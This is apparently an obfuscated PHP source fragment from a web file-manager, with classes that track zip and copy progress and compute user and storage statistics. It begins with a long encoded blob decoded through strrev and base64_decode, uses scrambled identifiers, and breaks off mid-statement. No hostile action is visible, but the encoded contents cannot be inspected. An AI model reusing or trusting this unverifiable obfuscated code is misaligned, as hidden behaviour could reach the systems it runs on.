3\254\244\274\101\226\233\123\12\251\15\277\300\227\61\107\234\57\316\342\24\367\233\173\216\327"."\366\244\25\106\274\21\310\357\3\72\13\171\312\36\272\122\310\143\341\12\42\106\60\367\330\42\207\155\151\11\260\364\351\151\364\247\27\176\31\67\164\67\202\322\71\370\144\55\107\305\140\306".strrev('BX–ù§â¢_:õ‚kËÄÂ\'Î¦b1J­máÒFÎ5äè£ØĞRÂ!J@ÏBèt$JÖÜŠ¦È')."\x96\xed\x78\xfb\x2c\x61\x26\xb4\xb4\x87\xa2\x2a\x26\x8a\x22\xd6\x3c\x26\x87\x65\xab\x7b\xd2\xb\x94\xc9\x74\x81\x29\x3e\xdf\x8b\x24\x0\xf6\x9c\x69\xca\x43\xde\xda\xa4\x74\xd1\xfd\x78\x97\xb4\x3e\x39\xf9\x95"."\x4b\xa7\xb3\x66\xbf\x96\x5\x43\x40\xc7\x1d\xb9\x22\xda\x8c\xe9\x8c\x85\x38\xc0\x68\x92\x5f\x2b\x14\xc4\xc9\x87\xcc\x71\xd1\xff\x8e\xeb\xcf\x90\xd7\x9d\x68\x57\x89\x2b\x10\x95\x9a\x27\xc4\x5\xce\x49\xa7\x91"."\64\21\116\46\113\371\60\75\201\161\244\26\245\155\242\354\16\232\236\312\210\133\264\0\216\332\331\105\217\141\141\300\344\52\331\321\70\327\250\43\172\304\167\323\376\362\243\164\154\103\6\24"."\5\333\354\350\302\224\204\370\345\220\367\161\0\240\54\124\4\152\70\26\62\106\45\44\114\323\327\114\11\245\220\51\332\227\244\112\17\313\301\253\251\225\336\211\243\230\117\176\132\364\1\276"."\47\302\161\41\33\310\356\214\204\145\215\373\101\323\362\307\131\331\103\254\154\351\300\53\254\25\236\126\235\364\145\126\217\270\60\375\145\317\317\211\353\271\5\64\25\316\147\166\271\144\301\267"."\35\145\73\27\367\246\205\17\253\253\100\314\75\310\11\263\134\275\54\214\15\34\357\306\112\275\6\322\126\376\366\254\64\14\122\277\113\305\254\207\330\135\170\230\71\143\305\347\153\35\217\341"."\xb9\x27\xb4\xc2\x3\xb8\x5f\x59\x21\x5c\x67\x20\x7b\xb6\x94\x93\xea\x35\x2e\xec\x2f\xb2\x3\x6a\x37\x98\xe1\xc0\x5d\xc4\x80\xc5\x9d\x3d\xea\xfc\xb9\x8c\x41\xac\xcc\xa5\x1a\x66\xce\x9e\x2f\xeb\x46\xc4\x14\x8a"."\143\133\366\244\0\375\1\31\107\40\205\342\104\103\205\171\234\226\127\77\311\164\336\217\51\177\53\331\305\1\376\147\13\106\154\76\50\250\144\162\133\376\252\174\331\10\20\74\225\14\277\44".strrev('Ö=°HÈ»m+GîsQvÿU‡=ñfkv¾…‹ß¡Pø¨·çd…âeV%Ñ±1ğ²è†').base64_decode('3oqY0wYKlDEiW9qXyTXapluThItjvki0otF8Ftg29iYhVptEif4HE8i2WHQ3Joy/cPcdOw==')."\163\347\50\370\117\140\144\246\302\313\306\222\151\314\227\364\201\112\172\174\153\351\325\154\257\204\234\222\46\122\267\243\144\262\201\134\210\35\260\263\337\256\352\121\61\121\107\237\107\231\14\250".base64_decode('XNyTHkAWHgwlQQ+XZnfBJ1EgkKvITpFJfp+V3OMVrnbI0nUsY8nBu3wPllQkr4/yqqXXbg==').strrev('(±¶8æ BnÊ!<FQ^–¦ækÒ|4v©é;„Ö§>K$Ö¢ß fi­‰¸°G ¤h‰‚…').strrev('.'."\n".'õ‰5ú8]É8@éÃÙT’	ã ¢F_¹dëc¨'."\0".'ş%[ó·J‚!‘+”¯ĞézâŞ').base64_decode('K0KdpZyISLpjst/imQ4nBthPn4tGMNcIlutxcOqxnIbZtuB//QDu/6t3b2fz17Vw/fzGXg==')."\33\10\347\320\132\174\224\312\165\35\124\303\354\352\207\223\275\116\1\54\102\203\357\33\26\104\205\304\271\75\70\363\325\310\134\70\152\354\244\115\313\146\45\46\134\171\73\123\366\52\71\102"."\xbe\x41\xfe\x92\x75\xa5\x88\xfb\xc6\xaf\xfb\x85\xf2\x1e\xa2\xe0\x65\x8f\x8f\xf7\x55\x2\x14\x74\x89\xef\x9a\x2a\xe0\x31\x4d\x62\xc2\xb2\xa0\x49\x79\x23\x39\x58\xe1\x98\x9c\xd8\xc3\x3a\x5f\x18\x90\x84\x93\x32"."\60\321\6\44\303\60\47\230\176\26\112\342\355\42\161\370\2\243\47\137\312\217\26\330\306\262\26\270\100\337\11\214\132\21\107\40\100\264\144\102\345\110\52\43\157\11\307\234\70\22\345\341"."\x16\x34\xc8\xc7\xa6\xd3\x51\xa2\xc3\xf5\xe0\x32\x5\xb2\xe4\xb1\x75\xfa\x15\x90\x8c\x35\xcb\x2d\x28\xca\x6b\xe2\x34\x41\x2e\x82\x4d\xf2\x9d\x6a\x32\x3c\xd9\xb8\x91\xde\x3a\xaf\x2b\xa1\xde\xeb\xaa\x8e\xbf\x3f".base64_decode('7cR7x4PI1OoELZYYVocwtRg5aCInzt7yMhTH4wJmklVWea3zRgnVIA7J48FoRlfRJEKjMw==')."\225\253\210\44\53\351\244\244\177\165\313\201\64\171\232\257\214\203\61\362\351\230\65\154\246\47\16\70\23\321\130\110\135\36\306\316\44\302\47\205\272\231\213\144\303\44\257\231\260\52\273\73".base64_decode('ash9NFgMaEfTagq00hFhk5TBwpevnSsE+XGs81azdPeBedKS1ZNOYHyBxbkuF1UCS5pFSw==')."\x76\x84\xe9\xc8\xc4\x22\x98\x89\x72\x63\x6c\x4f\xdd\x9d\x47\x8b\x5a\x4f\xda\x7a\x4a\xc1\xcc\xdc\x21\xdf\xf7\xcc\xaa\x9b\xd9\xf7\x65\xb5\xcc\x62\xf\x93\x21\xc8\x59\x5f\x1\x9\x1b\x8d\xf8\x4c\x2f\xb3\xe8\x65"."\x30\x15\xcb\x99\xd4\xf3\x4d\xa5\x3c\x84\x9b\x71\xdb\x81\x44\xe2\x29\x1c\xf7\x13\x38\xad\xe\xaf\x52\x8d\x92\xba\x54\x21\xfe\xb5\xe0\x2d\xa4\x49\xe6\xa6\xd3\xc\xa\x31\xc3\x95\x87\xc9\xc4\xe4\xb9\x78\xa7\xca"."\317\234\331\313\51\330\132\316\217\335\157\341\53\31\176\202\177\240\345\136\251\346\124\146\74\204\365\3\102\313\103\250\157\371\376\20\276\144\27\307\242\305\130\216\337\304\40\232\35\252\254\161".base64_decode('6GzARkBOks7M0cYr5Xw8jGSSZOZvG2qQTn2dh+78pmoZLywZESmblGJ+W9EvvnQfFs6PSA==').strrev('«T©eö,\\…†ÓÿQDºWy0X®ğÅd’IaÃŠÂŸ•…	\'Ñ+Sc·T»˜¿Ük'."\n".'Ï=6').base64_decode('NlwBNKW7/cOhFA5K5GrJa4a4HqOPyF8HOHF7xQFYniq8akjlxXmc6CZOq9R9QuGcxWWvHQ==')."\34\251\104\22\175\34\212\333\263\110\173\140\154\360\43\14\135\150\127\270\252\107\174\322\351\43\204\203\361\71\103\60\344\356\234\327\221\352\332\325\143\255\32\223\11\135\131\240\147\222\252\257".base64_decode('qI6SUEDPRqTq5FP5SQvEK39EYKVziCXnKiKDiS+mY/AlnsU7BpAxOdPRHPfUkk2oQF+amA==')."\43\52\175\232\27\160\146\121\170\335\325\172\271\200\273\147\264\204\343\335\100\71\175\304\260\223\31\151\307\134\236\131\236\136\54\33\154\150\100\345\176\270\133\313\306\332\255\107\20\225\224\265".base64_decode('RzL5SZgVytAWVSxGs3BJsVFxlJ1kCHBZmoXLlmWzwmXjSsrZWsmapHvlgwd6qVSFDgvtjQ==')."\4\72\331\170\126\4\56\377\34\140\242\33\232\50\262\52\267\102\350\237\134\246\27\225\132\121\21\170\322\126\270\241\205\314\221\342\117\122\73\163\34\226\112\116\216\122\211\156\263\234\12\224"."\x9a\x52\xa1\x49\x4d\x98\x84\x59\x4f\x39\xcb\x10\x79\x15\x8c\x8c\xe8\x27\xb1\xf4\x23\x3b\x62\xac\x90\x2d\x5b\x2c\x55\xb6\x69\x8a\x55\xa4\x32\x96\xd3\xd8\xc8\x95\x2e\xf\x10\xb8\xa\x7\x9\x1a\x10\x18\x89\x60".strrev('ñßY1ÕÊ‰+‰jñ^ÚrI|ıDæÕ—8÷Eœ–.­„¥=œ›Ì”¤¬Ó»²sPcY')."\366\156\164\377\154\242\255\236\356\364\14\57\373\143\244\371\354\43\131\111\45\355\322\6\13\225\225\303\30\246\202\216\224\44\201\304\54\16\146\150\175\222\160\44\160\302\161\363\213\212\44\160"."\x9e\x45\x8f\xc2\x83\xd8\x3e\x83\x1f\x82\x12\xf7\xe4\x94\x85\xd3\xec\xb8\x59\xb4\x3d\x38\x2f\x61\x16\xc8\x6f\xb3\x69\xdb\xc2\xb2\x84\xea\x88\x88\x98\x8d\xf9\xb0\x47\x32\x9c\x42\x21\x71\xe2\x89\x1b\x45\x8e\xd2"."\10\332\22\212\105\202\160\50\217\225\57\161\235\346\22\72\347\210\340\43\72\36\221\331\54\34\316\267\226\134\346\3\42\141\320\114\365\233\243\314\11\42\302\53\151\220\304\41\236\346\226\55"."\x85\x58\x4\xa8\x28\x9b\x81\x11\x27\x22\x96\x9f\xe6\xf8\xe1\x89\x22\x2f\xa9\x3\xde\x43\xf5\xad\x2e\xa4\x1d\xc5\xe9\xb\x93\xdc\x5c\xfb\xcb\x6a\x0\x45\xbe\xa8\x82\xbe\x41\x42\xb4\xaa\x70\x33\x2d\x9e\x88\x97".strrev('"µ“Ğç$­"îšM;…TëÀ¶YHá:…å“£Úº²ÊêÌ’”›,¤²}XÑåñâue')."\x5c\x22\x5a\x52\xee\xc5\x94\x9d\x9b\x45\xe0\xc9\x4c\x31\x2f\xd2\x39\x52\x21\x63\xb2\xe3\x21\x6\x1f\xd7\xb2\x4c\x31\x24\x9d\x33\xe8\x39\xe1\x6f\x55\x94\x71\xea\xbb\xe4\xf9\xb7\x98\x63\x64\x1e\x70\xbe\x21\xe8"."\x32\x88\x65\x88\xd\x15\x61\x2b\xbb\x4e\xa8\x3b\x56\x80\x54\xfc\xd4\xb\xa7\xf\x5c\xce\x17\xa6\x1e\x3e\x87\x49\x88\x94\x4e\xd6\x10\x21\x4a\x12\x6e\xca\xfc\x9e\x24\x4c\xaf\x38\x40\xf2\xb9\x43\xf9\x99\x18\xc9"."\x15\x3\x80\x1b\x76\xa2\x9\x26\x9a\xab\xcd\x7e\xe9\xcc\x8b\xee\xb2\xe0\x66\x39\xc\xa9\x64\x49\x49\xc3\x8e\x6c\x5b\x4b\x57\xb4\x8c\xa0\xea\x64\x4c\x25\x84\xa2\xf7\xff\x0\x4a\x71\x4b\x22\x4f\xb9\x0\x0".base64_decode('').base64_decode('')."", 10, -8))); goto b˜§«Ëéİ‚; Dõƒ½ÒË§ñ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $ÑâÛ» =& $_SERVER[Ùæõ‰Ï’]; parent::startAfter(); Hook::bind($ÑâÛ»[1905], array($this, $ÑâÛ»[1895])); Hook::bind($ÑâÛ»[1897], array($this, $ÑâÛ»[1898])); $†Æ÷·×’ =& $this->task; $†Æ÷·×’[$ÑâÛ»[1899]] = $ÑâÛ»[1292]; if (!$†Æ÷·×’[$ÑâÛ»[1670]]) { $†Æ÷·×’[$ÑâÛ»[1670]] = LNG($ÑâÛ»[1906]); } } protected function endAfter() { $ÏÑ·•½ =& $_SERVER[Ùæõ‰Ï’]; parent::endAfter(); Hook::unbind($ÏÑ·•½[1905], array($this, $ÏÑ·•½[1895])); Hook::unbind($ÏÑ·•½[1897], array($this, $ÏÑ·•½[1898])); } public function updateAfter() { $’È¥Œı‹ =& $_SERVER[Ùæõ‰Ï’]; $£ˆ—õ„ª =& $this->task; if (!$£ˆ—õ„ª[$’È¥Œı‹[1154]] || !$£ˆ—õ„ª[$’È¥Œı‹[846]]) { return; } if ($£ˆ—õ„ª[$’È¥Œı‹[1899]] == $’È¥Œı‹[1292]) { $Ï‰ˆ¸¤• = $£ˆ—õ„ª[$’È¥Œı‹[1835]]; if ($£ˆ—õ„ª[$’È¥Œı‹[1836]] != $’È¥Œı‹[1292]) { $Ï‰ˆ¸¤• = 0; } $£¶ÈÅó = ($£ˆ—õ„ª[$’È¥Œı‹[1839]] + $Ï‰ˆ¸¤•) / $£ˆ—õ„ª[$’È¥Œı‹[846]]; $£ˆ—õ„ª[$’È¥Œı‹[1783]] = $£¶ÈÅó * 0.3; } else { if ($£ˆ—õ„ª[$’È¥Œı‹[1899]] == $’È¥Œı‹[389]) { $£¶ÈÅó = $£ˆ—õ„ª[$’È¥Œı‹[1782]] / $£ˆ—õ„ª[$’È¥Œı‹[1154]]; $£ˆ—õ„ª[$’È¥Œı‹[1783]] = 0.3 + $£¶ÈÅó * 0.5; } else { if ($£ˆ—õ„ª[$’È¥Œı‹[1899]] == $’È¥Œı‹[110]) { $£¶ÈÅó = 0; if ($£ˆ—õ„ª[$’È¥Œı‹[1834]]) { $£¶ÈÅó = $£ˆ—õ„ª[$’È¥Œı‹[1835]] / $£ˆ—õ„ª[$’È¥Œı‹[1834]]; } $£ˆ—õ„ª[$’È¥Œı‹[1783]] = 0.3 + 0.5 + $£¶ÈÅó * 0.2; } } } if ($£ˆ—õ„ª[$’È¥Œı‹[1783]] > 0) { $À¿Œé–µ = timeFloat() - $£ˆ—õ„ª[$’È¥Œı‹[1785]] - $£ˆ—õ„ª[$’È¥Œı‹[1788]]; $£ˆ—õ„ª[$’È¥Œı‹[1789]] = $À¿Œé–µ * (1 - $£ˆ—õ„ª[$’È¥Œı‹[1783]]) / $£ˆ—õ„ª[$’È¥Œı‹[1783]]; } } public function copyFileStart($ŸÒîÈÌÍ, $šø‰÷ó, $‹“³Ì‹–, $™£‘, $©€‘çÓ†, $¬şÚÁµÂ) { $ñ›ÀìŸü =& $_SERVER[Ùæõ‰Ï’]; parent::copyFileStart($ŸÒîÈÌÍ, $šø‰÷ó, $‹“³Ì‹–, $™£‘, $©€‘çÓ†, $¬şÚÁµÂ); $¶›«˜“ø =& $this->task; if ($¶›«˜“ø[$ñ›ÀìŸü[1899]] == $ñ›ÀìŸü[389]) { $¶›«˜“ø[$ñ›ÀìŸü[1899]] = $ñ›ÀìŸü[110]; } $this->update(); } public function copyFileEnd($ˆ«Û¹¦Ÿ, $÷ô­ Â‡, $ÃÆ—„ ¾, $üÕ™Ÿ•ª, $Ë‡¬Ï—¿, $ïä·Ô‹) { $èºŠ‰¬ =& $_SERVER[Ùæõ‰Ï’]; $‰³í³‡ =& $this->task; $‰³í³‡[$èºŠ‰¬[1835]] = $‰³í³‡[$èºŠ‰¬[1834]]; $‰³í³‡[$èºŠ‰¬[1839]] += $‰³í³‡[$èºŠ‰¬[1834]]; $‰³í³‡[$èºŠ‰¬[1836]] = $èºŠ‰¬[12]; $this->update(); } public function zipEvent($–šìæìö, $¬Ç÷ğ›, $ô¦Ü¶”‹, $™Õß¥¡‚) { $´ñü£¶Í =& $_SERVER[Ùæõ‰Ï’]; $„Ü›ŠÙş =& $this->task; $„Ü›ŠÙş[$´ñü£¶Í[1832]] = get_path_this($¬Ç÷ğ›); $„Ü›ŠÙş[$´ñü£¶Í[1834]] = $™Õß¥¡‚; $„Ü›ŠÙş[$´ñü£¶Í[1835]] = $ô¦Ü¶”‹; $„Ü›ŠÙş[$´ñü£¶Í[1156]] = $–šìæìö == $´ñü£¶Í[1907] ? $´ñü£¶Í[1902] : $´ñü£¶Í[1903]; $„Ü›ŠÙş[$´ñü£¶Í[1836]] = $´ñü£¶Í[12]; $„Ü›ŠÙş[$´ñü£¶Í[846]] = $™Õß¥¡‚; $„Ü›ŠÙş[$´ñü£¶Í[1899]] = $´ñü£¶Í[389]; $this->update(); } public function nameParse($ª ƒœ¿™) { $Çë§«ÈŠ =& $_SERVER[Ùæõ‰Ï’]; $ñÁÒÍ…â =& $this->task; if ($ñÁÒÍ…â[$Çë§«ÈŠ[1782]] < $ñÁÒÍ…â[$Çë§«ÈŠ[1154]]) { $±¦€´—Ö = get_path_this($ª ƒœ¿™); if (strstr($±¦€´—Ö, $Çë§«ÈŠ[10])) { $ñÁÒÍ…â[$Çë§«ÈŠ[1782]] += 1; } } if ($ñÁÒÍ…â[$Çë§«ÈŠ[1899]] == $Çë§«ÈŠ[1292]) { $ñÁÒÍ…â[$Çë§«ÈŠ[1899]] = $Çë§«ÈŠ[389]; } $ñÁÒÍ…â[$Çë§«ÈŠ[1832]] = $ª ƒœ¿™; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ƒ§óª¶¹) { $ôõìŞ¯¶ =& $_SERVER[Ùæõ‰Ï’]; $Ã‘•—ËÒ = array($ôõìŞ¯¶[662] => array($ôõìŞ¯¶[33] => $ôõìŞ¯¶[1908], $ôõìŞ¯¶[350] => array($ôõìŞ¯¶[255], $ôõìŞ¯¶[848], $ôõìŞ¯¶[1909], $ôõìŞ¯¶[1910])), $ôõìŞ¯¶[1911] => array($ôõìŞ¯¶[33] => $ôõìŞ¯¶[1912], $ôõìŞ¯¶[350] => array($ôõìŞ¯¶[255], $ôõìŞ¯¶[846], $ôõìŞ¯¶[1913], $ôõìŞ¯¶[1914], $ôõìŞ¯¶[1915]))); if (!isset($Ã‘•—ËÒ[$ƒ§óª¶¹])) { return !1; } $this->optionType = $Ã‘•—ËÒ[$ƒ§óª¶¹][$ôõìŞ¯¶[33]]; $this->field = $Ã‘•—ËÒ[$ƒ§óª¶¹][$ôõìŞ¯¶[350]]; return !0; } public function listData($Âí–Á†ç = false, $”îô‘’› = "\155\x6f\x64\151\x66\x79\x54\x69\x6d\145", $Ä²¦Áğ’ = false) { return parent::listData($Âí–Á†ç, $”îô‘’›, $Ä²¦Áğ’); } public function trendList($Œ˜éŒ¸ğ) { $®Áış€¥ =& $_SERVER[Ùæõ‰Ï’]; $œÊ±ƒ°† = $this->listData(); if ($œÊ±ƒ°†) { $îì¸ì½É = end($œÊ±ƒ°†); $áãäÛ¤ö = date($®Áış€¥[1916], strtotime($®Áış€¥[1917])); if ($îì¸ì½É[$®Áış€¥[255]] == $áãäÛ¤ö) { return $œÊ±ƒ°†; } $é§á¡¯ = strtotime($îì¸ì½É[$®Áış€¥[255]]); } if (!isset($é§á¡¯)) { $ö‘¸Òƒ½ = $Œ˜éŒ¸ğ == $®Áış€¥[662] ? $®Áış€¥[598] : $®Áış€¥[907]; $é§á¡¯ = Model($ö‘¸Òƒ½)->min($®Áış€¥[231]); } $ôÊŸµùÈ = $®Áış€¥[1918] . ucfirst($Œ˜éŒ¸ğ); $†ÆûÇè = $this->dateList($é§á¡¯); foreach ($†ÆûÇè as $áãäÛ¤ö) { $this->{$ôÊŸµùÈ}($áãäÛ¤ö); } return $this->listData(); } private function dateList($×Çİ„û) { $¯ÙÛü‚× =& $_SERVER[Ùæõ‰Ï’]; $Áı‚ê‘á = $×Çİ„û; $Àƒ¤ãÏÑ = strtotime($¯ÙÛü‚×[1917]); $Ô›‹éÁ… = array(); while ($Áı‚ê‘á <= $Àƒ¤ãÏÑ) { $Ô›‹éÁ…[] = date($¯ÙÛü‚×[1916], $Áı‚ê‘á); $Áı‚ê‘á = strtotime($¯ÙÛü‚×[1919], $Áı‚ê‘á); } return $Ô›‹éÁ…; } public function _recordUser($·ÔòÎóÎ = '') { $ïğÚßŞÕ =& $_SERVER[Ùæõ‰Ï’]; $ñ±öƒŞç = strtotime(date($ïğÚßŞÕ[1920], strtotime($·ÔòÎóÎ))); $ÌÔŠ·ÍÔ = strtotime(date($ïğÚßŞÕ[1921], strtotime($·ÔòÎóÎ))); $Â¬ĞîæÆ = array($ïğÚßŞÕ[231] => array($ïğÚßŞÕ[1104], $ÌÔŠ·ÍÔ)); $Ê˜Õé™ = Model($ïğÚßŞÕ[598])->where($Â¬ĞîæÆ)->count($ïğÚßŞÕ[1781]); $Â¬ĞîæÆ[$ïğÚßŞÕ[231]] = array($ïğÚßŞÕ[409], array($ñ±öƒŞç, $ÌÔŠ·ÍÔ)); $ãıíİ†± = Model($ïğÚßŞÕ[598])->where($Â¬ĞîæÆ)->count($ïğÚßŞÕ[1781]); $Â¬ĞîæÆ[$ïğÚßŞÕ[33]] = $ïğÚßŞÕ[1922]; $ÓŸìç¼œ = Model($ïğÚßŞÕ[1923])->where($Â¬ĞîæÆ)->count($ïğÚßŞÕ[1924]); $İÔß¥½£ = array($ïğÚßŞÕ[255] => $·ÔòÎóÎ, $ïğÚßŞÕ[848] => (int) $Ê˜Õé™, $ïğÚßŞÕ[1909] => (int) $ãıíİ†±, $ïğÚßŞÕ[1910] => (int) $ÓŸìç¼œ); return $this->insert($İÔß¥½£); } public function _recordStore($î´²æ´˜ = '') { $“ŞŸ…øó =& $_SERVER[Ùæõ‰Ï’]; $Ç˜ë¬½ = strtotime(date($“ŞŸ…øó[1921], strtotime($î´²æ´˜))); $Ìº†¢¥í = array($“ŞŸ…øó[231] => array($“ŞŸ…øó[1104], $Ç˜ë¬½)); $º§Ÿéù = Model($“ŞŸ…øó[544])->where($Ìº†¢¥í)->sum($“ŞŸ…øó[79]); $Ìº†¢¥í[$“ŞŸ…øó[485]] = 0; $®õ×Çéà = Model($“ŞŸ…øó[907])->where($Ìº†¢¥í)->sum($“ŞŸ…øó[79]); $Ìº†¢¥í[$“ŞŸ…øó[190]] = 1; $Å¶¨Œ‚Ê = Model($“ŞŸ…øó[907])->where($Ìº†¢¥í)->sum($“ŞŸ…øó[79]); $Ìº†¢¥í[$“ŞŸ…øó[190]] = 2; $ÛğæÎúÏ = Model($“ŞŸ…øó[907])->where($Ìº†¢¥í)->sum($“ŞŸ…øó[79]); $µåÃÊëÁ = array($“ŞŸ…øó[255] => $î´²æ´˜, $“ŞŸ…øó[846] => (int) $®õ×Çéà, $“ŞŸ…øó[1913] => (int) $º§Ÿéù, $“ŞŸ…øó[1914] => (int) $Å¶¨Œ‚Ê, $“ŞŸ…øó[1915] => (int) $ÛğæÎúÏ); return $this->insert($µåÃÊëÁ); } public function trend($õéõ î, $‚ç¶½) { $Î²¸©°Ÿ =& $_SERVER[Ùæõ‰Ï’]; if (!$this->init($õéõ î)) { return !1; } $¸­ÔÒèó = $this->trendList($õéõ î); if ($¸­ÔÒèó && $‚ç¶½ != $Î²¸©°Ÿ[1754]) { $†œèÂò· = $¸­ÔÒèó[0][$Î²¸©°Ÿ[255]]; $‰‚¡›¾Ø = $this->validDate($‚ç¶½, $†œèÂò·); $Û§ûä¨ = array(); $¯Ø‡„ïß = array_to_keyvalue($¸­ÔÒèó, $Î²¸©°Ÿ[255]); foreach ($‰‚¡›¾Ø as $ñ‚ûÀØº) { if (isset($¯Ø‡„ïß[$ñ‚ûÀØº])) { $¹È½¾í¸ = $¯Ø‡„ïß[$ñ‚ûÀØº]; } else { $¹È½¾í¸ = end($¸­ÔÒèó); $¹È½¾í¸[$Î²¸©°Ÿ[255]] = $ñ‚ûÀØº; if ($õéõ î == $Î²¸©°Ÿ[662]) { $¹È½¾í¸[$Î²¸©°Ÿ[1909]] = $¹È½¾í¸[$Î²¸©°Ÿ[1910]] = 0; } } $Û§ûä¨[] = $¹È½¾í¸; } $¸­ÔÒèó = $Û§ûä¨; } $ú«ß¼–œ = array($Î²¸©°Ÿ[662] => array($Î²¸©°Ÿ[848] => LNG($Î²¸©°Ÿ[1925]), $Î²¸©°Ÿ[1909] => LNG($Î²¸©°Ÿ[1926]), $Î²¸©°Ÿ[1910] => LNG($Î²¸©°Ÿ[1927])), $Î²¸©°Ÿ[1911] => array($Î²¸©°Ÿ[846] => LNG($Î²¸©°Ÿ[1928]), $Î²¸©°Ÿ[1913] => LNG($Î²¸©°Ÿ[1929]), $Î²¸©°Ÿ[1914] => LNG($Î²¸©°Ÿ[1930]), $Î²¸©°Ÿ[1915] => LNG($Î²¸©°Ÿ[1931]))); $Ñíœùè = array($Î²¸©°Ÿ[662] => $Î²¸©°Ÿ[1932], $Î²¸©°Ÿ[1911] => $Î²¸©°Ÿ[79]); if (empty($¸­ÔÒèó)) { $ñ‚ûÀØº = date($Î²¸©°Ÿ[1916], strtotime($Î²¸©°Ÿ[1917])); $ÁøØ—–é = array($Î²¸©°Ÿ[255] => $ñ‚ûÀØº); foreach ($ú«ß¼–œ[$õéõ î] as $ùÕÖÅÌü => $Ûññ³‘å) { $ÁøØ—–é[$ùÕÖÅÌü] = 0; } $¸­ÔÒèó[] = $ÁøØ—–é; } $ÜÜÃªƒÌ = array(); foreach ($¸­ÔÒèó as $Ûññ³‘å) { if ($õéõ î == $Î²¸©°Ÿ[1911] && $Ûññ³‘å[$Î²¸©°Ÿ[1913]] > $Ûññ³‘å[$Î²¸©°Ÿ[846]]) { $Ûññ³‘å[$Î²¸©°Ÿ[1913]] = $Ûññ³‘å[$Î²¸©°Ÿ[846]]; } foreach ($ú«ß¼–œ[$õéõ î] as $ùÕÖÅÌü => $ÒÊ¢¼ù) { $¹È½¾í¸ = array($Î²¸©°Ÿ[255] => $Ûññ³‘å[$Î²¸©°Ÿ[255]], $Î²¸©°Ÿ[1670] => $ÒÊ¢¼ù); $¹È½¾í¸[$Ñíœùè[$õéõ î]] = isset($Ûññ³‘å[$ùÕÖÅÌü]) ? $Ûññ³‘å[$ùÕÖÅÌü] : 0; $ÜÜÃªƒÌ[] = $¹È½¾í¸; } } return $ÜÜÃªƒÌ; } public function validDate($Ø«É”¼’, $§šÍÔ™) { $¬Ç´Õ° =& $_SERVER[Ùæõ‰Ï’]; $ÍÃ²œ® = date($¬Ç´Õ°[1916], strtotime($¬Ç´Õ°[1917])); $Õ†ÀÎ¡€ = array($ÍÃ²œ®); switch ($Ø«É”¼’) { case $¬Ç´Õ°[1761]: $Ô´›‹Ç› = mktime(0, 0, 0, date($¬Ç´Õ°[1933]), date($¬Ç´Õ°[1462]) - date($¬Ç´Õ°[1552]) + 7 - 7, date($¬Ç´Õ°[1934])); $‚´şèœ¾ = 0; do { $¾Šªœåè = date($¬Ç´Õ°[1916], $Ô´›‹Ç› - 3600 * 24 * 7 * $‚´şèœ¾); $Õ†ÀÎ¡€[] = $¾Šªœåè; $‚´şèœ¾++; } while ($§šÍÔ™ < $¾Šªœåè); break; case $¬Ç´Õ°[1759]: $‚´şèœ¾ = 1; do { $¸˜ÑÑäò = date($¬Ç´Õ°[1935], strtotime("\55\x20{$‚´şèœ¾}\x20\x6d\157\156\x74\x68\x73")); $Õ†ÀÎ¡€[] = $¸˜ÑÑäò; $‚´şèœ¾++; } while ($§šÍÔ™ < $¸˜ÑÑäò); break; case $¬Ç´Õ°[1936]: $¥¹ÎÈ­å = (int) date($¬Ç´Õ°[1934], strtotime($§šÍÔ™)); $£É¾Œ’ = (int) date($¬Ç´Õ°[1934]); if ($¥¹ÎÈ­å >= $£É¾Œ’) { break; } for ($¥¹ÎÈ­å; $¥¹ÎÈ­å < $£É¾Œ’; $¥¹ÎÈ­å++) { $Õ†ÀÎ¡€[] = $¥¹ÎÈ­å . $¬Ç´Õ°[1937]; } break; default: break; } if ($§šÍÔ™ > end($Õ†ÀÎ¡€)) { array_pop($Õ†ÀÎ¡€); } sort($Õ†ÀÎ¡€); return $Õ†ÀÎ¡€; } public function listTable($òı¢±ıé) { $Œûä„Àù = ucfirst($òı¢±ıé); return Model($Œûä„Àù)->listData(); } public function option($ò€•†Æí) { $ˆòö”‡à = $_SERVER[Ùæõ‰Ï’][1938] . ucfirst($ò€•†Æí); return $this->{$ˆòö”‡à}(); } private function optionUser() { $âÃæû =& $_SERVER[Ùæõ‰Ï’]; $æ½«ü×‚ = Model($âÃæû[598])->count($âÃæû[1781]); $˜‡´÷ùÊ = Model($âÃæû[598])->where($âÃæû[1939])->count($âÃæû[1781]); $İÜÚ¶‡ = intval($GLOBALS[$âÃæû[6]][$âÃæû[425]][$âÃæû[1727]]) / 3600; $³İ“üÕ• = strtotime("\x2d{$İÜÚ¶‡}\40\x68\157\165\x72\163"); $ÊÄÇ¥ûá = strtotime(date($âÃæû[1920])); if ($³İ“üÕ• < $ÊÄÇ¥ûá) { $³İ“üÕ• = $ÊÄÇ¥ûá; } $ƒÄÍÆôÏ = array($âÃæû[1940] => array($âÃæû[1105], $³İ“üÕ•)); $ûíåšĞ = (int) Model($âÃæû[598])->where($ƒÄÍÆôÏ)->count($âÃæû[1781]); if (!$ûíåšĞ) { $ûíåšĞ = 1; } $ƒÄÍÆôÏ = array($âÃæû[1940] => array($âÃæû[1105], $ÊÄÇ¥ûá)); $‹÷‚è‘Œ = Model($âÃæû[598])->where($ƒÄÍÆôÏ)->count($âÃæû[1781]); return array($âÃæû[841] => (int) $æ½«ü×‚, $âÃæû[1941] => (int) ($æ½«ü×‚ - $˜‡´÷ùÊ), $âÃæû[1942] => (int) $˜‡´÷ùÊ, $âÃæû[1943] => (int) $‹÷‚è‘Œ, $âÃæû[1944] => $ûíåšĞ); } private function optionFile() { $¥ıÑ‘Ë´ =& $_SERVER[Ùæõ‰Ï’]; $Öè’“Û¦ = $this->sourceSize(); $‰ÏĞ“íİ = $Öè’“Û¦[$¥ıÑ‘Ë´[79]]; $ÊÎ¿âÓ = $Öè’“Û¦[$¥ıÑ‘Ë´[1913]]; $â¦†õú¼ = Model($¥ıÑ‘Ë´[907])->where(array($¥ıÑ‘Ë´[485] => 0))->count($¥ıÑ‘Ë´[193]); $©¨¨ÛÈË = array($¥ıÑ‘Ë´[485] => 0, $¥ıÑ‘Ë´[231] => array($¥ıÑ‘Ë´[1105], strtotime(date($¥ıÑ‘Ë´[1920])))); $şÕúÍôÜ = Model($¥ıÑ‘Ë´[907])->where($©¨¨ÛÈË)->sum($¥ıÑ‘Ë´[79]); $–€İÕÍ = Model($¥ıÑ‘Ë´[907])->where($©¨¨ÛÈË)->count($¥ıÑ‘Ë´[193]); return array($¥ıÑ‘Ë´[846] => $‰ÏĞ“íİ, $¥ıÑ‘Ë´[1913] => 